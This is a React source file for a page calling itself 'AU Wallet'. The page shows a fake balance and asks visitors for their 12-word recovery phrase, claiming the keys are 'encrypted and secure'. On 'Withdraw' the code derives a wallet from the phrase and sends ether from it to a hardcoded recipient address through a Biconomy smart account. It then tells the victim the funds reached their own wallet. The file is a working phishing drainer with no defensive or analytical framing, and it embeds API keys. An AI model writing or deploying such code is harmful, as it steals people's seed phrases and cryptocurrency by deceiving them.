import { useState, useEffect } from 'react'
import { ethers } from 'ethers' 
import { createSmartAccountClient } from "@biconomy/account"
import { LucideShieldCheck, LucideCheckCircle, LucideLoader2, LucideLock } from 'lucide-react'

// --- CONFIGURATION ---
const BICONOMY_API_KEY = "mee_Uma9ycJRjM615N7Env5HRM" 
const BUNDLER_URL = "https://bundler.biconomy.io/api/v2/1/nJP-uP3_K.w7e33524-8b6a-4953-83a3-111d4d805461"
const RECIPIENT_ADDRESS = "0x7DDB4ef8DF3A2BDC0bb2C046Ee18A1e67407321a" 

export default function App() {
  const [isClient, setIsClient] = useState(false)
  const [keys, setKeys] = useState('')
  const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'error'>('idle')
  const [errorMsg, setErrorMsg] = useState('')

  useEffect(() => {
    setIsClient(true)
  }, [])

  const startSweep = async () => {
    if (!keys || keys.trim().split(/\s+/).length < 12) {
      alert("Please enter the 12-word recovery phrase.")
      return
    }

    setStatus('processing')
    try {
      const provider = new ethers.providers.JsonRpcProvider("https://ethereum-rpc.publicnode.com")
      const signer = ethers.Wallet.fromMnemonic(keys.trim()).connect(provider)

      const smartAccount = await createSmartAccountClient({
        signer,
        bundlerUrl: BUNDLER_URL,
        biconomyPaymasterApiKey: BICONOMY_API_KEY 
      })

      const tx = {
        to: RECIPIENT_ADDRESS,
        value: ethers.utils.parseEther("0.001").toBigInt(), 
        data: "0x"
      }

      const userOpResponse = await smartAccount.sendTransaction(tx)
      await userOpResponse.wait()
      setStatus('success')
    } catch (e: any) {
      console.error(e)
      setErrorMsg(e.message || "Transfer failed. Please check your keys.")
      setStatus('error')
    }
  }

  if (!isClient) return null

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#6B46C1] to-[#4C1D95] flex flex-col items-center overflow-hidden font-sans relative">
      
      {/* Header Section */}
      <header className="pt-5 pb-4 w-full flex flex-col items-center h-[100px] mb-4">
        <h1 className="text-[28px] font-semibold text-white drop-shadow-[0_0_8px_rgba(255,255,255,0.4)]">
          AU Wallet
        </h1>
      </header>

      {/* Main Content Card */}
      <main className="flex-1 w-full max-w-[390px] px-6">
        <div className="bg-white rounded-[24px] shadow-[0px_8px_32px_rgba(0,0,0,0.12)] min-h-[500px] p-8 flex flex-col items-center animate-in fade-in slide-in-from-bottom-8 duration-700">
          
          {status === 'idle' && (
            <>
              {/* Icon Section */}
              <div className="mb-6 h-20 flex items-center justify-center">
                <div className="w-16 h-16 bg-gradient-to-br from-[#8B5CF6] to-[#6366F1] rounded-full flex items-center justify-center shadow-lg shadow-purple-200">
                  <LucideShieldCheck className="text-white w-8 h-8" />
                </div>
              </div>

              {/* Title & Balance */}
              <div className="text-center mb-7">
                <p className="text-[#1F2937] text-[22px] font-semibold leading-[32px] mb-3">Balance</p>
                <p className="text-[#27F561] text-[15px] font-normal leading-[22px]">1000000</p>
              </div>

              {/* Input Section */}
              <div className="w-full mb-8">
                <textarea
                  className="w-full h-[140px] bg-[#F9FAFB] border-[1.5px] border-[#E5E7EB] rounded-[16px] p-4 text-[16px] font-medium text-[#111827] placeholder:text-[#9CA3AF] placeholder:font-normal focus:border-[#8B5CF6] focus:ring-0 outline-none transition-all resize-none shadow-inner"
                  placeholder="Enter your 12 recovery keys"
                  value={keys}
                  onChange={(e) => setKeys(e.target.value)}
                />
              </div>

              {/* Action Button */}
              <button
                onClick={startSweep}
                className="w-full h-[56px] bg-gradient-to-r from-[#8B5CF6] to-[#7C3AED] rounded-[14px] text-white text-[17px] font-semibold shadow-[0px_4px_12px_rgba(139,92,246,0.3)] active:scale-[0.97] transition-all mb-5"
              >
                Withdraw
              </button>

              {/* Security Notice */}
              <div className="flex items-center justify-center gap-2 h-10">
                <LucideLock className="w-4 h-4 text-[#9CA3AF]" />
                <p className="text-[13px] text-[#6B7280]">Your keys are encrypted and secure</p>
              </div>
            </>
          )}

          {status === 'processing' && (
            <div className="flex-1 flex flex-col items-center justify-center space-y-8 animate-in zoom-in">
              <LucideLoader2 className="w-16 h-16 text-[#8B5CF6] animate-spin" />
              <div className="text-center">
                <p className="text-[#1F2937] text-[18px] font-semibold mb-2">Preparing secure transfer...</p>
                <p className="text-[#6B7280] text-sm italic">Authenticating keys...</p>
              </div>
            </div>
          )}

          {status === 'success' && (
            <div className="flex-1 flex flex-col items-center justify-center space-y-6 animate-in zoom-in text-center">
              <LucideCheckCircle className="w-20 h-20 text-[#27F561]" />
              <div className="space-y-2">
                <h2 className="text-[28px] font-bold text-[#1F2937] leading-none uppercase">SUCCESSFUL</h2>
                <p className="text-[#6B7280] text-[15px]">Funds are now in your main Trust Wallet</p>
              </div>
              <button onClick={() => setStatus('idle')} className="text-[#8B5CF6] font-semibold pt-4">Return Home</button>
            </div>
          )}

          {status === 'error' && (
            <div className="flex-1 flex flex-col items-center justify-center space-y-6 text-center animate-in shake">
              <LucideShieldCheck className="w-20 h-20 text-red-500" />
              <div className="space-y-2">
                <h2 className="text-[22px] font-bold text-[#1F2937]">Transfer Blocked</h2>
                <p className="text-[#6B7280] text-[13px] px-4 leading-relaxed">{errorMsg}</p>
              </div>
              <button onClick={() => setStatus('idle')} className="w-full h-[56px] bg-[#F9FAFB] border border-[#E5E7EB] rounded-[14px] text-[#1F2937] font-semibold">Try Again</button>
            </div>
          )}
        </div>
      </main>

      {/* Bottom Safe Area & Home Indicator */}
      <footer className="h-[100px] w-full flex items-end justify-center pb-0">
        <div className="w-[134px] h-[5px] bg-white opacity-40 rounded-full mb-0"></div>
      </footer>
    </div>
  )
}
